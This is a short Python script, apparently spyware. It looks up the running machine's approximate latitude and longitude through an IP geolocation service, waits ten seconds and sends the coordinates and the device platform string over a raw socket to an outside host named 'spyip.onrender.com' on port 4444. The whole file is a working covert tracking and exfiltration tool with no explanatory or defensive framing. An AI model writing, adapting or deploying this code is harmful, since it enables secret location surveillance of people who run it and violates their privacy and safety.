import socket
import requests
import time
import platform

def get_location():
    try:
        response = requests.get('http://ip-api.com/json/')
        data = response.json()
        return data['lat'], data['lon']
    except Exception as e:
        print(f"Error getting location: {e}")
        return None, None

def send_location():
    host = 'spyip.onrender.com'
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    lat, lon = get_location()
    device_info = platform.platform()
    if lat and lon:
        location = f"Location: {lat}, {lon}, Device: {device_info}"
        s.send(location.encode())
    s.close()

if __name__ == "__main__":
    time.sleep(10)  # Wait a bit before executing
    send_location()
